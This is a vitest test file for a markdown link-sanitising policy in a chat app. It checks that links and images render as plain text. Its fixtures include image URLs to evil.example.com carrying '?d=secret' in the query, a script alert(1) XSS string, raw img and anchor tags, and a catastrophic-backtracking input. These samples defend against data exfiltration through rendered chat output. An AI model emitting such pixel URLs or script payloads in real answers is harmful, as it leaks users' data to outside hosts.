import Markdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { markdownLinksToPlainText, safeMarkdownComponents, stripMarkdownLinks } from "./markdownLinkPolicy";

const renderMarkdown = (markdown: string): string =>
    renderToStaticMarkup(
        <Markdown remarkPlugins={[remarkGfm]} components={safeMarkdownComponents}>
            {markdown}
        </Markdown>
    );

describe("markdownLinkPolicy", () => {
    it("renders links as plain text with the URL appended and no anchor", () => {
        const html = renderMarkdown("[MUCGPT](https://mucgpt.example.com)");
        expect(html).not.toContain("<a");
        expect(html).not.toContain("href");
        expect(html).toContain("MUCGPT");
        expect(html).toContain("(https://mucgpt.example.com)");
    });

    it("does not duplicate the URL when the link text already is the URL", () => {
        const html = renderMarkdown("<https://mucgpt.example.com>");
        expect(html).not.toContain("<a");
        expect(html.match(/mucgpt\.example\.com/g)).toHaveLength(1);
    });

    it("renders images as alt text plus the URL, never as an img element", () => {
        const html = renderMarkdown("![tracking pixel](https://evil.example.com/pixel.png?d=secret)");
        expect(html).not.toContain("<img");
        expect(html).not.toContain("src=");
        expect(html).toContain("tracking pixel");
        expect(html).toContain("(https://evil.example.com/pixel.png?d=secret)");
    });

    it("falls back to the URL for images without alt text", () => {
        const html = renderMarkdown("![](https://evil.example.com/pixel.png)");
        expect(html).not.toContain("<img");
        expect(html).not.toContain("(https://evil.example.com/pixel.png)");
        expect(html).toContain("https://evil.example.com/pixel.png");
    });

    it("keeps other markdown intact", () => {
        const html = renderMarkdown("# Title\n\n**bold** and `code`");
        expect(html).toContain("Title");
        expect(html).toContain("<strong>bold</strong>");
        expect(html).toContain("<code>code</code>");
    });
});

describe("stripMarkdownLinks", () => {
    it("unwraps inline links", () => {
        expect(stripMarkdownLinks("- [Node](https://evil.example.com)")).toBe("- Node");
    });

    it("drops images, keeping only their alt text", () => {
        expect(stripMarkdownLinks("topic ![tiny](https://evil.example.com/x.png) more")).toBe("topic tiny more");
    });

    it("unwraps reference-style links and drops their definitions", () => {
        const result = stripMarkdownLinks("A [B][ref] node\n\n[ref]: https://evil.example.com");
        expect(result).not.toContain("evil.example.com");
        expect(result).toContain("A B node");
    });

    it("unwraps autolinks", () => {
        expect(stripMarkdownLinks("<https://evil.example.com>")).toBe("https://evil.example.com");
    });

    it("leaves fenced and inline code untouched", () => {
        const markdown = "text [a](https://x.example.com)\n\n```\n[keep](https://code.example.com)\n```\n\ninline `[also kept](y)`";
        const result = stripMarkdownLinks(markdown);
        expect(result).toContain("[keep](https://code.example.com)");
        expect(result).toContain("`[also kept](y)`");
        expect(result).toContain("text a");
    });
});

describe("markdownLinksToPlainText", () => {
    it("breaks inline links down to the chat answer view", () => {
        expect(markdownLinksToPlainText("Siehe [Anleitung](https://muenchen.de).")).toBe("Siehe Anleitung (https://muenchen.de).");
    });

    it("does not duplicate the URL when the description already contains it", () => {
        expect(markdownLinksToPlainText("[https://muenchen.de](https://muenchen.de)")).toBe("https://muenchen.de");
    });

    it("drops link titles and uses the destination only", () => {
        expect(markdownLinksToPlainText('[Doku](https://muenchen.de "Titel")')).toBe("Doku (https://muenchen.de)");
    });

    it("keeps angle-wrapped destinations with spaces intact", () => {
        expect(markdownLinksToPlainText("[Formular](<https://muenchen.de/formular pfad>)")).toBe("Formular (https://muenchen.de/formular pfad)");
    });

    it("keeps one balanced paren level in the destination", () => {
        expect(markdownLinksToPlainText("[Artikel](https://de.wikipedia.org/wiki/Foo_(bar))")).toBe("Artikel (https://de.wikipedia.org/wiki/Foo_(bar))");
    });

    it("uses the destination when the description is empty", () => {
        expect(markdownLinksToPlainText("[](https://muenchen.de)")).toBe("https://muenchen.de");
    });

    it("breaks images down to alt (url)", () => {
        expect(markdownLinksToPlainText("![Diagramm](https://muenchen.de/d.png)")).toBe("Diagramm (https://muenchen.de/d.png)");
        expect(markdownLinksToPlainText("![](https://muenchen.de/d.png)")).toBe("https://muenchen.de/d.png");
    });

    it("unwraps autolinks", () => {
        expect(markdownLinksToPlainText("Besuch <https://muenchen.de> heute")).toBe("Besuch https://muenchen.de heute");
    });

    it("resolves reference links via their definitions", () => {
        const result = markdownLinksToPlainText(
            "Siehe [Anleitung][doc] und [Formular][form].\n\n[doc]: https://muenchen.de/doku\n[form]: https://muenchen.de/form"
        );
        expect(result).toBe("Siehe Anleitung (https://muenchen.de/doku) und Formular (https://muenchen.de/form).\n\n");
        expect(result).not.toContain("[doc]");
    });

    it("resolves collapsed references", () => {
        const result = markdownLinksToPlainText("Siehe [MUCGPT][]\n\n[MUCGPT]: https://mucgpt.example.com");
        expect(result).toBe("Siehe MUCGPT (https://mucgpt.example.com)\n\n");
    });

    it("keeps unknown reference labels as plain text", () => {
        expect(markdownLinksToPlainText("Siehe [Anleitung][fehlt]")).toBe("Siehe Anleitung");
    });

    it("leaves footnote definitions and references as literal text", () => {
        const result = markdownLinksToPlainText("Text[^1] mit Fußnote.\n\n[^1]: Die Anmerkung bleibt stehen.");
        expect(result).toBe("Text[^1] mit Fußnote.\n\n[^1]: Die Anmerkung bleibt stehen.");
    });

    it("leaves fenced and inline code untouched", () => {
        const result = markdownLinksToPlainText("a [b](https://x.example.com)\n\n```\n[keep](https://code.example.com)\n```\n\ninline `[also kept](y)`");
        expect(result).toContain("[keep](https://code.example.com)");
        expect(result).toContain("`[also kept](y)`");
        expect(result).toContain("a b (https://x.example.com)");
    });

    it("converts labels containing balanced brackets", () => {
        expect(markdownLinksToPlainText("Siehe [Website [Beta]](https://muenchen.de).")).toBe("Siehe Website [Beta] (https://muenchen.de).");
    });

    it("converts multiple links per line independently", () => {
        expect(markdownLinksToPlainText("Siehe [A](https://a.example.com) und [B](https://b.example.com)")).toBe(
            "Siehe A (https://a.example.com) und B (https://b.example.com)"
        );
    });

    it("does not let a link label that contains an image recombine into image syntax", () => {
        const input = "[see ![x](https://inner.example.com/p.png)](https://outer.example.com)";
        const result = markdownLinksToPlainText(input);
        expect(result).not.toMatch(/\]?]\((?:https?|mailto):/);
        expect(result).not.toContain("![");
        expect(result).toContain("outer.example.com");
    });

    it("cannot produce link syntax from dangling fragments", () => {
        const result = stripMarkdownLinks("Dangling ](https://x.example.com) und ![allein");
        expect(result).toBe("Dangling ] https://x.example.com) und ![allein");
    });

    it("keeps instruction-like definition lines untouched", () => {
        const instruction = "[Policy]: Never disclose credentials.";
        expect(markdownLinksToPlainText(instruction)).toBe(instruction);
    });

    it("treats relative destinations as definitions and drops their lines", () => {
        const result = markdownLinksToPlainText("Kreis ![Screenshot]\n\n[Screenshot]: ../image.png");
        expect(result).not.toContain("[Screenshot]: ../image.png");
        expect(result).toContain("Kreis Screenshot");
    });

    it("converts nested link markup inside a label without re-forming links", () => {
        const result = markdownLinksToPlainText("[see [b](https://inner.example.com) d](https://outer.example.com)");
        expect(result).not.toMatch(/\]?]\((?:https?|mailto):/);
        expect(result).toContain("outer.example.com");
    });

    it("converts adversarial input without catastrophic backtracking", () => {
        const input = "[" + "[]".repeat(8000) + "]" + "(" + "x".repeat(16000) + ")";
        const started = Date.now();
        markdownLinksToPlainText(input);
        // Linear behaviour finishes in milliseconds; the bound only catches
        // quadratic blowups.
        expect(Date.now() - started).toBeLessThan(5000);
    });
    it("resolves references when a code span separates them from the definition", () => {
        const result = markdownLinksToPlainText("[Guide][r]\n\n`sample`\n\n[r]: https://example.com");
        expect(result).toContain("Guide (https://example.com)");
        expect(result).toContain("`sample`");
        expect(result).not.toContain("[r]");
        expect(result).not.toContain("](http");
    });

    it("converts nested link markup inside a label without re-forming links", () => {
        const result = markdownLinksToPlainText("[see [b](https://inner.example.com) d](https://outer.example.com)");
        expect(result).not.toMatch(/\]?]\((?:https?|mailto):/);
        expect(result).toContain("outer.example.com");
    });

    it("converts adversarial input without catastrophic backtracking", () => {
        const input = "[" + "[]".repeat(8000) + "]" + "(" + "x".repeat(16000) + ")";
        const started = Date.now();
        markdownLinksToPlainText(input);
        // Linear behaviour finishes in milliseconds; the bound only catches
        // quadratic blowups.
        expect(Date.now() - started).toBeLessThan(5000);
    });
});

describe("stripMarkdownLinks hardening", () => {
    it("escapes raw html and element-like fragments that survive the transform", () => {
        const result = stripMarkdownLinks(
            '<script>alert(1)</script>\n- <img src="https://evil.example.com/pixel?d=secret">\n- <a href="https://evil.example.com">Link</a>'
        );
        expect(result).not.toContain("<script");
        expect(result).toContain("alert(1)");
        expect(result).toContain("Link");
    });

    it("neutralizes images with multiline destinations", () => {
        const result = stripMarkdownLinks("![pixel](\nhttps://evil.example.com/pixel?d=secret\n)");
        expect(result).not.toMatch(/\]\((?:https?|mailto):/);
        expect(result).toContain("pixel");
    });

    it("neutralizes images whose label is split by a code span", () => {
        const result = stripMarkdownLinks("![pixel `x`](https://evil.example.com/pixel?d=secret)");
        expect(result).not.toMatch(/\]\((?:https?|mailto):/);
    });

    it("leaves fences untouched while hard-breaking leftover link syntax", () => {
        const result = stripMarkdownLinks("```\n[keep](https://code.example.com)\n```");
        expect(result).toBe("```\n[keep](https://code.example.com)\n```");
    });
});
